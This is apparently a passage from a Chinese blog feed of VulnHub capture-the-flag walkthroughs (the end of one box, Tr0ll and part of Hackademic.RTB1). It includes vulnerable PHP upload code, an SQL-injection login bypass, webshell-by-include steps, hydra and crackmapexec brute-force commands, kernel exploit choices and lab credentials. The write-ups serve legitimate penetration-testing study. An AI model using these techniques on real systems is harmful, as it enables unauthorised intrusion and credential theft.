class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;id&#x27;</span>]);<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br>&#123;<br><span class="hljs-variable">$iname</span>=<span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$conn</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br><span class="hljs-variable">$r</span>=<span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);<br><span class="hljs-variable">$image</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpeg&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$r</span>,<span class="hljs-variable">$image</span>))<br>&#123;<br><span class="hljs-variable">$finfo</span> = @<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">finfo</span>(FILEINFO_MIME); <br><span class="hljs-variable">$filetype</span> = @<span class="hljs-variable">$finfo</span>-&gt;<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/jpeg/&#x27;</span>,<span class="hljs-variable">$filetype</span> )  || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/png/&#x27;</span>,<span class="hljs-variable">$filetype</span> ) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/image\/gif/&#x27;</span>,<span class="hljs-variable">$filetype</span> ))<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;uploaded_images/&#x27;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;image&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]))<br> &#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Uploaded successfully &quot;</span>;<br>  <span class="hljs-variable">$update</span>=<span class="hljs-string">&#x27;insert into users(name,address,image,id) values(\&#x27;&#x27;</span>.<span class="hljs-variable">$name</span>.<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&#x27;\&#x27;,\&#x27;&#x27;</span>.<span class="hljs-variable">$iname</span>.<span class="hljs-string">&#x27;\&#x27;, \&#x27;&#x27;</span>.<span class="hljs-variable">$id</span>.<span class="hljs-string">&#x27;\&#x27;)&#x27;</span>; <br> <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$update</span>);<br>  <br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;i told you dear, only png,jpg and gif file are allowed&quot;</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;only png,jpg and gif file are allowed&quot;</span>;<br><br>&#125;<br>     &#125;<br> &#125;<br></code></pre></td></tr></table></figure><blockquote><p>c.php：数据库配置文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155516.png" alt="image.png"></p><blockquote><p>前往phpmy登录phpmyadmin：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155526.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155546.png" alt="image.png"></p><blockquote><p>从auth表拿到了登录凭据：<code>biLLu@hEx_it</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155552.png" alt="image.png"></p><blockquote><p>传内容为一句话的jpg文件，修改MIME：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155559.png" alt="image.png"></p><blockquote><p>尝试加mageic number：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155608.png" alt="image.png"></p><blockquote><p>成功上传</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155626.png" alt="image.png"></p><blockquote><p>因为panel页面的load参数有include，所以也没必要用解析漏洞了，直接包含：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155632.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155639.png" alt="image.png"></p><blockquote><p>发现居然有一堆disable_funs：<br> pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority</p></blockquote><blockquote><p>幸运的是反弹shell用的没ban全，测试发现可以curl出网：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155659.png" alt="image.png"></p><blockquote><p>拿到立足点</p></blockquote><h2 id="0x03-提权"><a href="#0x03-提权" class="headerlink" title="0x03 提权"></a>0x03 提权</h2><blockquote><p>基础向量枚举后无思路，感觉又是内核提权，跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155725.png" alt="image.png"></p><blockquote><p>3.13版本也对上了，优先尝试CVE-2015-1328，其次脏牛，最后其他</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155743.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155750.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x04-反思总结"><a href="#0x04-反思总结" class="headerlink" title="0x04 反思总结"></a>0x04 反思总结</h2><blockquote><ol><li>提供文件下载功能的test页面通过<code>curl</code>传参直接可以看到内容：</li></ol></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -X POST --data <span class="hljs-string">&quot;file=c.php&quot;</span> http://10.10.10.136/test.php<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155800.png" alt="image.png"></p><h3 id="转义-单引号逃逸注入"><a href="#转义-单引号逃逸注入" class="headerlink" title="转义-单引号逃逸注入"></a>转义-单引号逃逸注入</h3><blockquote><p>登录页面可以sql注入：将第一个参数的后引号转义，从而使第二个参数的前引号被闭合，导致第二个参数逃逸</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$uname</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;un&#x27;</span>]));                                    <span class="hljs-variable">$pass</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;ps&#x27;</span>]));                                     <span class="hljs-variable">$run</span>=<span class="hljs-string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="hljs-variable">$pass</span>.<span class="hljs-string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="hljs-variable">$uname</span>.<span class="hljs-string">&#x27;\&#x27;&#x27;</span>;           <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$run</span>);      <br></code></pre></td></tr></table></figure><blockquote><p>查询语句：<br>select * from auth where pass&#x3D;’PASS’ and uname&#x3D;’NAME’</p></blockquote><blockquote><p>故让PASS的值为<code>\</code>，NAME的值为<code> or 1#</code>达成注入，写入后为：<br>select * from auth where pass&#x3D;’ \‘ and uname&#x3D;’ or 1#’<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155807.png" alt="image.png"></p></blockquote><h3 id="phpmyadmin配置文件获取"><a href="#phpmyadmin配置文件获取" class="headerlink" title="phpmyadmin配置文件获取"></a>phpmyadmin配置文件获取</h3><blockquote><p>本机的非预期提权方式，拿phpmyadmin配置文件，ssh root密码使用了与之相同的密码</p></blockquote><blockquote><p>配置文件获取方式：</p><ol><li>公开信息利用：常用敏感信息git项目<a href="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt">Auto_Wordlists&#x2F;wordlists&#x2F;file_inclusion_linux.txt at main · carlospolop&#x2F;Auto_Wordlists (github.com)</a></li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155815.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155824.png" alt="image.png"></p><blockquote><p>注：数据库的登录凭据不一定和phpmyadmin的相同，是映射关系</p></blockquote><blockquote><ol start="2"><li>问gpt：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328155833.png" alt="image.png"></p><h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><ol><li>端口扫描：80 web、22 ssh</li><li>web渗透：目录爆破出各功能页面，由文件包含拿到全部源码，审计后发现phpmyadmin登录凭据，登录后拿到主页面登录凭据；使用文件上传功能传图片马，由文件包含点getshell</li><li>提权：linpeas枚举，发现内核为熟悉的3.13.0(ubuntu)，使用经典的37292.c成功提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Tr0ll</title>
    <link href="/blog/vulnhub/vulnhub%20Tr0ll/"/>
    <url>/blog/vulnhub/vulnhub%20Tr0ll/</url>
    
    <content type="html"><![CDATA[<p>vulhub Tr0ll walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>tcp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143514.png" alt="image.png"></p><blockquote><p>udp：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143523.png" alt="image.png"></p><blockquote><p>详细信息扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143534.png" alt="image.png"></p><blockquote><p>ftp允许匿名登录，且有一个lol.pcap文件可写<br>操作系统为ubuntu<br>web服务有两个目录被扫出来，但什么也没有：<br><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143541.png" alt="image.png"></p></blockquote><blockquote><p>脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143608.png" alt="image.png"></p><blockquote><p>脚本扫描没有暴露出什么信息<br>粗略的看了web服务，什么也没有，且ftp存在匿名登录<br>跑起目录爆破，开始ftp渗透：</p></blockquote><h2 id="0x02-ftp渗透"><a href="#0x02-ftp渗透" class="headerlink" title="0x02 ftp渗透"></a>0x02 ftp渗透</h2><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143621.png" alt="image.png"></p><blockquote><p>注意：要用binary模式下数据包(二进制)文件！否则会损失内容！</p></blockquote><blockquote><p>PCAP（Packet Capture）文件是一种用于捕获网络数据包的文件格式。它包含了网络通信期间捕获到的数据包的详细信息，例如源地址、目标地址、数据包类型和传输协议。</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143632.png" alt="image.png"></p><blockquote><p>目录爆破没有结果，放心开始分析数据包：</p></blockquote><h3 id="流量分析"><a href="#流量分析" class="headerlink" title="流量分析"></a>流量分析</h3><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143654.png" alt="image.png"></p><blockquote><p>追踪可疑的ftp数据流发现下载了一个<code>secret_stuff.txt</code>的文件</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143705.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143717.png" alt="image.png"></p><blockquote><p>获得了一个像web路径的单词<code>sup3rs3cr3tdirlol</code>，尝试访问：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143737.png" alt="image.png"></p><blockquote><p>得到一个二进制文件，就用wireshark打开：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143744.png" alt="image.png"></p><blockquote><p>让我们去找地址为0x0856BF的进程？</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143755.png" alt="image.png"></p><blockquote><p>猜测是找Identification为0x0856BF的数据包，但是没找到<br>以为是知识盲区看了wp，结果竟然还是web路径！</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143805.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143819.png" alt="image.png"></p><blockquote><p>得到好像是用户名的列表，爆破ftp和ssh中优先选择ssh：</p></blockquote><h3 id="ssh爆破"><a href="#ssh爆破" class="headerlink" title="ssh爆破"></a>ssh爆破</h3><blockquote><p>尝试密码喷射，以防用户名和密码有重叠：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">crackmapexec ssh 10.10.10.135 -p user.txt -u user.txt  --continue-on-success | grep <span class="hljs-string">&#x27;+&#x27;</span> <br></code></pre></td></tr></table></figure><blockquote><p>hydra大字典爆破：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.135 ssh<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143839.png" alt="image.png"></p><blockquote><p>果然ssh不该大字典爆破<br>这里又看了wp，作者提示的密码居然是<code>Pass.txt</code>这个字符串…</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143903.png" alt="image.png"></p><blockquote><p>这脑洞没谁了…</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143911.png" alt="image.png"></p><h2 id="0x03-内核提权"><a href="#0x03-内核提权" class="headerlink" title="0x03 内核提权"></a>0x03 内核提权</h2><blockquote><p>linpeas枚举：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328143931.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144005.png" alt="image.png"></p><blockquote><p>linpeas枚举结果看出大概率内核提权，三个高可能项：CVE-2016-5195、CVE-2015-1328、CVE-2015-8660</p></blockquote><blockquote><p>先试脏牛CVE-2016-5195：</p><ol><li>40616编译成功，执行失败</li><li>34923编译失败</li><li>43345编译成功，执行失败</li></ol></blockquote><blockquote><p>试CVE-2015-1328，这个版本号、操作系统都对上了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144014.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144052.png" alt="image.png"></p><blockquote><p>成功提权</p></blockquote><h2 id="0x04-反思总结"><a href="#0x04-反思总结" class="headerlink" title="0x04 反思总结"></a>0x04 反思总结</h2><blockquote><ol><li>拿到无明显特征文件(如本机的roflmao)时要用工具判断文件类型，而不是直接打开：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144108.png" alt="image.png"></p><blockquote><p>可以直接执行，也可以用strings命令读数据（用于从一个二进制文件中提取可读的字符串）</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144418.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144441.png"></p><blockquote><ol start="2"><li>不管拿到什么奇怪的字符串都要勇于去试是不是web路径，即使是0x0856BF这种地址字符串</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144459.png" alt="image.png"></p><blockquote><ol start="3"><li>本机的rolfmao为32位ELF可执行文件，可执行文件可以用IDA反编译出源码：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328144519.png" alt="image.png"></p><h2 id="0x05-靶机总结"><a href="#0x05-靶机总结" class="headerlink" title="0x05 靶机总结"></a>0x05 靶机总结</h2><ol><li>端口扫描：ftp、web、ssh开启</li><li>ftp渗透：匿名登录拿到一个流量包，分析得到web路径，拿到ssh用户名和密码，获得了立足点</li><li>内核提权：linpeas枚举出可能的cve，多次分析尝试后成功提权</li></ol>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pentest</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulhub Hackademic.RTB1</title>
    <link href="/blog/vulnhub/vulnhub%20Hackademic.RTB1/"/>
    <url>/blog/vulnhub/vulnhub%20Hackademic.RTB1/</url>
    
    <content type="html"><![CDATA[<p>vulhub Hackademic.RTB1 walkthrough</p><h2 id="0x01-端口扫描"><a href="#0x01-端口扫描" class="headerlink" title="0x01 端口扫描"></a>0x01 端口扫描</h2><blockquote><p>主机发现：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140855.png" alt="image.png"></p><blockquote><p>全端口扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140903.png" alt="image.png"></p><blockquote><p>只开了80，udp扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140911.png" alt="image.png"></p><blockquote><p>详细信息扫描+脚本扫描：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140923.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328140936.png" alt="image.png"></p><blockquote><p>好像开启了TRACE提交方法，开始web渗透：</p></blockquote><h2 id="0x02-web渗透"><a href="#0x02-web渗透" class="headerlink" title="0x02 web渗透"></a>0x02 web渗透</h2><blockquote><p>先跑起目录爆破，看前端：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141100.png" alt="image.png"></p><blockquote><p>go root可点</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141100.png"></p><blockquote><p>可疑参数p，测试idor：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141121.png" alt="image.png"></p><blockquote><p>报出cms是wordpress 1.5.1.1<br>看目录爆破结果：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141134.png" alt="image.png"></p><blockquote><p>有phpmyadmin页面，也印证了应该是wordpress的cms，但是403了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141141.png" alt="image.png"></p><blockquote><p>TRACE也没暴露出什么有用信息：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141157.png" alt="image.png"></p><blockquote><p>改为审网页源码：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141219.png" alt="image.png"></p><blockquote><p>发现wp并不在网站根目录，也难怪刚刚没扫到，加上这个路径再次扫描，这次选深度扫描的dirb：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141227.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141234.png" alt="image.png"></p><blockquote><p>确实是一个wordpress的站，按wordpress的流程走：</p></blockquote><h3 id="wordpress渗透"><a href="#wordpress渗透" class="headerlink" title="wordpress渗透"></a>wordpress渗透</h3><blockquote><p>用户名爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141244.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate u<br></code></pre></td></tr></table></figure><blockquote><p>直接上rockyou密码爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141303.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141315.png" alt="image.png"></p><blockquote><p>跑了很久没跑出来，因为太慢决定换hydra对登录页爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141325.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l NickJames -P /usr/share/wordlists/rockyou.txt 10.10.10.134 -s 80 http-post-form <span class="hljs-string">&quot;/Hackademic_RTB1/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;submit=Login+%C2%BB&amp;redirect_to=wp-admin%2F:Back to blog&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>爆破的同时去看看暴露出来的xmlrpc.php能否利用：<br>参考：[[RPC#XML-RPC]]</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141335.png" alt="image.png"></p><blockquote><p>可以利用，但是不知道凭据的情况下，只能尝试读文件了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141343.png" alt="image.png"></p><blockquote><p>无法利用，跑起wpscan的漏洞扫描：</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan --url http://10.10.10.134/Hackademic_RTB1/ --enumerate ap --api-token  0Du8ow5jLqgfJgCOnxvsgKaEZacsPltJCKAaQDyFoCg<br></code></pre></td></tr></table></figure><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141352.png" alt="image.png"></p><blockquote><p>扫出16种漏洞，走投无路时来尝试这些公开漏洞</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141403.png" alt="image.png"></p><blockquote><p>运气很好，hydra已经爆破出了密码，登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141424.png" alt="image.png"></p><blockquote><p>成功登录</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141452.png" alt="image.png"></p><blockquote><p>研究了半天也没有传文件的地方，猜测是这个用户权限太低了</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141529.png" alt="image.png"></p><blockquote><p>看到是level 1，应该是权限问题，毕竟该用户名是通过wpscan的简单枚举得到的，应该还有高权限用户，思路转为寻找其他用户</p></blockquote><blockquote><p>根据登录页面输错用户名的特殊报错wrong username尝试爆破：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141604.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -p FYHypo -L /usr/share/wordlists/rockyou.txt 10.10.10.134 -s 80 http-post-form <span class="hljs-string">&quot;/Hackademic_RTB1/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;submit=Login+%C2%BB&amp;redirect_to=wp-admin%2F:Wrong username&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>没抱太大希望，但果然爆不出来，只能尝试利用刚刚的公开漏洞了：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141612.png" alt="image.png"></p><blockquote><p>xss不考虑，看到有注入漏洞，这给方向和我们的目标拿新凭据是吻合的，搜索相关利用：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141638.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141645.png" alt="image.png"></p><blockquote><p>可能的利用点在<code>index?cat</code>参数，尝试：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141657.png" alt="image.png"></p><blockquote><p>证实cat参数下存在注入点，</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141747.png" alt="image.png"></p><blockquote><p>测到了布尔盲注，但因为不想写脚本，再测联合注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141806.png" alt="image.png"></p><blockquote><p>也有，那就联合查询注入：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141813.png" alt="image.png"></p><blockquote><p>1本身有东西，换0看回显点：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141821.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141830.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141853.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141902.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141912.png" alt="image.png"></p><blockquote><p>注意这里直接写wp_users报错，打引号会被转义也报错，故用十六进制</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141935.png" alt="image.png"></p><blockquote><p>爆出数据<br>正常注入结束后也尝试了使用sqlmap：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141948.png" alt="image.png"></p><blockquote><p>必然是选择破解级别最高的 <code>GeorgeMiller | 7cbb3252ba6b7e9c422fac5334d22054</code></p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328141956.png" alt="image.png"></p><blockquote><p>GeorgeMiller@q1w2e3，登录：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142003.png" alt="image.png"></p><blockquote><p>有可以编辑php文件的功能：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142012.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142035.png" alt="image.png"></p><h2 id="0x03-内核提权"><a href="#0x03-内核提权" class="headerlink" title="0x03 内核提权"></a>0x03 内核提权</h2><blockquote><p>经过初步枚举未发现基础提权向量，查看内核版本很老，考虑内核提权：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142113.png" alt="image.png"></p><blockquote><p>跑linpeas：</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142143.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142352.png" alt="image.png"></p><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142415.png" alt="image.png"></p><blockquote><p>基本确定是脏牛了，开始尝试：</p></blockquote><blockquote><ol><li>最经典的40616先编译失败了</li></ol></blockquote><blockquote><ol start="2"><li>40611编译成功，但利用失败，没复制出来文件</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142425.png" alt="image.png"></p><blockquote><ol start="3"><li>因为没有g++，40847自然用不了</li><li>尝试40838：</li></ol></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142435.png" alt="image.png"></p><blockquote><p>编译成功，执行没反应<br>5. 尝试40839，编译失败</p></blockquote><blockquote><p>打脸了，脏牛可能不太行，linpeas误报，改为直接搜该内核版本的exp</p></blockquote><p><img src="https://fyhypo.oss-cn-chengdu.aliyuncs.com/blog/20240328142510.png" 